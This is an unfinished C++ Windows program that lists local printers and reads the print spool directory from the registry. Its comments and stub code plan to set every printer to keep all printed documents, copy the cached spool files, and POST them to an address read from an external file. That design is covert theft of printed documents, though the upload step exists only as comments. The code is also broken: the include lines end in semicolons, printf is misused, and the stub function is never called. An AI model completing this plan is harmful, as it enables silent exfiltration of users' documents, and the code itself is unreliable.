#include <windows.h>;
#include <winspool.h>;
#include <iostream>;
#include <atlstr.h>;

using namespace std;

PRINTER_INFO_2* list;
DWORD cnt = 0;
DWORD sz = 0;
DWORD Level = 2;
DWORD test;
LPDEVMODE pDevModeX;
int i;

void GetAllPrinters();
void GetDefaultSpoolFileDirectory();

int main(){

	GetAllPrinters();
	GetDefaultSpoolFileDirectory();


	cin.get();

	return 0;
}

//Get all Printers
void GetAllPrinters(){
	EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, NULL, 0, &sz, &cnt );

	//---This Fills the PRINTER_INFO_2 list---

	if ((list = (PRINTER_INFO_2*) malloc(sz)) == 0 )   //No Idea what this does yet. Snipped online.
		return;
	
	if(!EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, (LPBYTE)list, sz, &sz, &cnt)){free( list );
		return;
	}

	//---Ends the filling of the list---

	//---Print a list of all the printers---
	printf("Number of Printers on the computer is %i\n",cnt); //%i converts to int.

	CString PrintersName;

	for(int i = 0; i < (int)cnt; i++){
		printf("Name of a printer :%s\n",list[i].pPrinterName);  //Prints the Printers name
	}
	//---End Printing of Printers.. Ha---
}

//Change all printers to "Keep All Printed Documents" to "True"  -  http://support.microsoft.com/kb/167345
void ChangeKAPD(){
	test = DocumentProperties(NULL, NULL, list[0].pPrinterName, list[0].pDevMode, list[0].pDevMode, NULL); //Messing around with this.
	pDevModeX = (LPDEVMODE)malloc(test);

	//pDevModeX->dmDeviceName = "Test";

}

//Find the Windows Spoolfile Directory
void GetDefaultSpoolFileDirectory(){
	CString location = ("");
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,("SYSTEM\\CurrentControlSet\\Control\\Print\\Printers"),0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS){ //Attempts to open the Registry Key location.
		TCHAR value[256];
		DWORD dwKeyDataType;
		DWORD dwDataBufSize = 256;
		if (RegQueryValueEx(hKey,("DefaultSpoolDirectory"), NULL, &dwKeyDataType,(LPBYTE) &value, &dwDataBufSize) == ERROR_SUCCESS){ //Trys to get data from DefaultSpoolDirectory
			location = CString(value);
		}
		RegCloseKey(hKey); //Closes the key.
	}
	printf(location);
}

//Copy any files named "CachedFiles" into the same file as the EXE

//Get address from external file

//POST to that said address